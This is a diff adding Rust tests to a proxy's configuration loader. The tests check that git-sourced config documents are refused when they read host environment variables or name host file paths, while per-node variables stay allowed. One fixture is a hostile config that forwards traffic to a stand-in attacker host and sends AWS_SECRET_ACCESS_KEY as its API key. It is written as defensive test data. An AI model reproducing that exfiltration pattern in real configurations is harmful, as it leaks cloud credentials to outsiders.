@@ -39,6 +39,21 @@ const REPO_CONFIG_V2: &str = "proxy:\n  http_bind_port: 9090\norigins:\n  \
                               \"edge.example.com\":\n    action:\n      type: proxy\n      \
                               url: https://test.sbproxy.dev\n";
 
+/// A document that names a per-node value the way
+/// docs/configuration.md's "Node identity in a shared repository"
+/// documents it. Confinement leaves this form alone; the two tests above
+/// pin the forms it does not.
+const REPO_CONFIG_WITH_ENV: &str = r#"proxy:
+  http_bind_port: 8080
+origins:
+  "edge.example.com":
+    action:
+      type: static
+      status_code: 200
+      content_type: text/plain
+      body: "${SB_DEFINITELY_UNSET_XYZZY:-fallback}"
+"#;
+
 /// Assert that a `SB_TEST_UNSET_*` variable really is unset.
 ///
 /// These names are reserved-unset: nothing in this workspace ever
@@ -265,6 +280,78 @@ fn a_pin_naming_a_commit_this_repository_does_not_have_is_refused() {
         "{error:?}",
     );
     assert!(error.to_string().contains(&absent), "{error}");
+}
+
+// --- confinement (WOR-2433) ------------------------------------------
+
+#[test]
+fn a_git_document_reading_this_hosts_environment_is_refused() {
+    // Named against the loader, not the checker: `check_confined_document`
+    // being correct proves nothing about this branch calling it, and this
+    // branch is the only place in the loader where config text arrives
+    // from a party that is not the host owner.
+    if !require_git("a_git_document_reading_this_hosts_environment_is_refused") {
+        return;
+    }
+    let fixture = Fixture::new(
+        r#"origins:
+  "exfil.test":
+    action:
+      type: proxy
+      url: https://collect.attacker.example
+    authentication:
+      type: api_key
+      api_key: "env:AWS_SECRET_ACCESS_KEY"
+"#,
+    );
+    let error = resolve(&git_source(&fixture.url(), Some("main")))
+        .expect_err("a repository may not name this host's environment");
+    assert!(
+        matches!(error, ConfigSourceError::Confinement(_)),
+        "{error:?}",
+    );
+    assert_eq!(error.metric_label(), "confinement_refused");
+    assert!(
+        !error.is_unreachable(),
+        "the remote was reached; its content was refused"
+    );
+    assert!(error.to_string().contains("env:NAME"), "{error}");
+}
+
+#[test]
+fn a_git_document_naming_a_host_path_is_refused() {
+    if !require_git("a_git_document_naming_a_host_path_is_refused") {
+        return;
+    }
+    let fixture = Fixture::new(
+        r#"origins:
+  "edge.example.com":
+    request_modifiers:
+      - rego_module_path: /etc/sbproxy/anything.rego
+"#,
+    );
+    let error = resolve(&git_source(&fixture.url(), Some("main")))
+        .expect_err("a repository may not name a path on the host that compiles it");
+    assert!(
+        matches!(error, ConfigSourceError::Confinement(_)),
+        "{error:?}",
+    );
+}
+
+#[test]
+fn a_git_document_may_still_name_per_node_variables() {
+    // Confinement must not have taken away the documented and only
+    // supported way to run one shared repository across a fleet.
+    if !require_git("a_git_document_may_still_name_per_node_variables") {
+        return;
+    }
+    let fixture = Fixture::new(REPO_CONFIG_WITH_ENV);
+    let resolved = resolve(&git_source(&fixture.url(), Some("main")))
+        .expect("a per-node `${VAR}` stays legal in a git-sourced document");
+    assert_eq!(
+        resolved.text, REPO_CONFIG_WITH_ENV,
+        "the loader must return the document byte for byte, not a rewritten copy",
+    );
 }
 
 // --- failure modes ---------------------------------------------------
